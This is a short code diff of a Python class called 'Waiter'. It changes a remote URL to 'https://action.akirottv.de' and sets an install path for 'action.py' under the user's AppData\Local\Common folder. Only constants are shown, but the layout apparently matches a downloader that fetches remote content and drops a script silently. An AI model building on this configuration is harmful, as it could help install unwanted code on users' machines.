@@ -5,10 +5,10 @@ import subprocess
 import pathlib as pl
 
 class Waiter:
-    TXT_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/do_something.txt"
+    TXT_URL = "https://action.akirottv.de"
     APP_URL = ""
-    APP_NAME = "main"
-    FILE_NAME = "main.py"
+    APP_NAME = "action_service"
+    FILE_NAME = "action.py"
     BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
     APP_DIR = os.path.join(BASE_DIR, APP_NAME)
     APP_PATH = os.path.join(APP_DIR, FILE_NAME)
